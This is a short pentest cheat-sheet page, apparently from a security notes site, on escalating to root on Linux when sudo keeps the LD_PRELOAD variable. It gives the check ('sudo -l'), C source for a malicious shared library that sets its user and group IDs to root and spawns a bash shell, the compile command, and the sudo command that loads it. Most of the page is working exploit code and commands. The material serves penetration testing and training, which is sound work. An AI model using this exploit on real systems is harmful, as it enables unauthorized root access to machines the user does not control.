---
title: Sudo Privilege Escalation by Injecting Shared Library
description: LD_PRELOAD might be vulnerable to privilege escalation (PrivEsc).
tags:
    - Privilege Escalation
refs:
date: 2023-02-05
draft: false
---

## Investigation

Check sudo commands.

```sh
sudo -l
```

The below is the output example.

```bash
env_keep+=LD_PRELOAD

(ALL : ALL) NOPASSWD: somecmd
```

If we find the sudo command keeps **LD_PRELOAD** environment, we can overwrite this variable to load our custome shared object and escalate the privileges.

<br />

## Exploitation

First off, create **exploit.c** under **/tmp** .

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void inject()__attribute__((constructor));

void inject() {
	unsetenv("LD_PRELOAD");
	setuid(0);
	setgid(0);
	system("/bin/bash");
}
```

Then compile it.

```bash
gcc  -fPIC -shared -o exploit.so exploit.c
```

Now we can run and spawn the root shell.

```bash
sudo LD_PRELOAD=/tmp/exploit.so somecmd
```
